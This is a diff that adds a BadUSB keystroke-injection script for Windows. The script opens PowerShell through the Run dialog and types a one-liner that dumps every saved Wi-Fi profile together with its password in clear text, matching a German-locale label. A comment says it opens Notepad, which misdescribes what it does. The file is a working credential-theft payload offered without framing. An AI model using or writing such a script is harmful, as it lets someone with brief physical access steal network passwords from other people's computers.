@@ -1,0 +1,14 @@
+REM This is BadUSB script for windows
+
+REM Open windows notepad
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+
+ALTSTRING (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $name=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name="$name" key=clear) | Select-String "Schl.sselinhalt\W+\:(.+)$" | ForEach-Object { $pass=$_.Matches.Groups[1].Value.Trim(); New-Object -TypeName PSObject -Property @{ PROFILE_NAME = $name; PASSWORD = $pass } } } | Format-Table -AutoSize
+
+ENTER
